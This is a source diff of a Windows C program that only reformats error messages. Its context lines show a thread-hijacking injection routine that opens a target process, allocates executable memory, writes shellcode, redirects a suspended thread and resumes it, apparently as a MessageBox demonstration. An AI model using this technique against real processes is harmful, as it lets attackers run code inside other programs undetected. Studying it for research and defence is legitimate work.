@@ -218,7 +218,7 @@ int main(int argc, char* argv[])
 	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	if (processesSnapshot == INVALID_HANDLE_VALUE)
 	{
-		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
+		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
 		return 1;
 	}
 
@@ -226,7 +226,7 @@ int main(int argc, char* argv[])
 	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
 	if (!Process32First(processesSnapshot, &processEntry))
 	{
-		printf("Error %d - Failed to Process32First\n", GetLastError());
+		printf("[Error] %d - Failed to Process32First\n", GetLastError());
 		return 1;
 	}
 
@@ -244,7 +244,7 @@ int main(int argc, char* argv[])
 
 	if (!foundTargetProcess)
 	{
-		printf("Error - Failed to find process: %s\n", processName);
+		printf("[Error] - Failed to find process: %s\n", processName);
 		return 1;
 	}
 
@@ -254,7 +254,7 @@ int main(int argc, char* argv[])
 	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
 	if (!targetProcessHandle)
 	{
-		printf("Error %d - Failed to acquire process handle\n", GetLastError());
+		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
 		return 1;
 	}
 
@@ -262,7 +262,7 @@ int main(int argc, char* argv[])
 	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(reigsterpreserving_shellcode) - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!remoteMemory)
 	{
-		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
+		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
 		return 1;
 	}
 
@@ -272,7 +272,7 @@ int main(int argc, char* argv[])
 	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
 	if (!Thread32First(processesSnapshot, &currentThreadEntry))
 	{
-		printf("Error %d - Failed to Thread32First\n", GetLastError());
+		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
 		return 1;
 	}
 
@@ -289,7 +289,7 @@ int main(int argc, char* argv[])
 			}
 			if (SuspendThread(threadHandle) == -1)
 			{
-				printf("Error %d - Failed to suspend thread\n", GetLastError());
+				printf("[Error] %d - Failed to suspend thread\n", GetLastError());
 				return 1;
 			}
 
@@ -297,7 +297,7 @@ int main(int argc, char* argv[])
 			ctx.ContextFlags = CONTEXT_ALL;
 			if (!GetThreadContext(threadHandle, &ctx))
 			{
-				printf("Error %d - Failed to GetThreadContext\n", GetLastError());
+				printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
 				return 1;
 			}
 
@@ -316,21 +316,21 @@ int main(int argc, char* argv[])
 
 			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory, pushRegisters, sizeof(pushRegisters), NULL))
 			{
-				printf("Error %d - Failed to write pushRegisters shellcode to target process\n", GetLastError());
+				printf("[Error] %d - Failed to write pushRegisters shellcode to target process\n", GetLastError());
 				return 1;
 			}
 			
 			// the MessageBox shellcode will jump to pop registers as last step
 			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters), reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
 			{
-				printf("Error %d - Failed to write MessageBox shellcode to target process\n", GetLastError());
+				printf("[Error] %d - Failed to write MessageBox shellcode to target process\n", GetLastError());
 				return 1;
 			}
 			
 			// pop registers, thereby restoring the original register values
 			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) -1, correctStackAndPopRegisters, sizeof(correctStackAndPopRegisters), NULL))
 			{
-				printf("Error %d - Failed to write shellcode to target process\n", GetLastError());
+				printf("[Error] %d - Failed to write shellcode to target process\n", GetLastError());
 				return 1;
 			}
 
@@ -338,7 +338,7 @@ int main(int argc, char* argv[])
 			*(int64_t*)&absoluteJmp[6] = ctx.Xip;
 			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) - 1 + sizeof(correctStackAndPopRegisters), absoluteJmp, sizeof(absoluteJmp), NULL))
 			{
-				printf("Error %d - Failed to write absoluteJmp to target process\n", GetLastError());
+				printf("[Error] %d - Failed to write absoluteJmp to target process\n", GetLastError());
 				return 1;
 			}
 #else
@@ -349,7 +349,7 @@ int main(int argc, char* argv[])
 			// write shellcode into target process
 			if (!WriteProcessMemory(targetProcessHandle, remoteMemory, reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
 			{
-				printf("Error %d - Failed to write shellcode to target process\n", GetLastError());
+				printf("[Error] %d - Failed to write shellcode to target process\n", GetLastError());
 				return 1;
 			}
 #endif
@@ -359,7 +359,7 @@ int main(int argc, char* argv[])
 
 			if (SetThreadContext(threadHandle, &ctx) == 0)
 			{
-				printf("Error %d - Failed to SetThreadContext\n", GetLastError());
+				printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
 				return 1;
 			}
 
@@ -367,7 +367,7 @@ int main(int argc, char* argv[])
 
 			if (ResumeThread(threadHandle) == -1)
 			{
-				printf("Error %d - Failed to resume thread\n", GetLastError());
+				printf("[Error] %d - Failed to resume thread\n", GetLastError());
 				return 1;
 			}
 
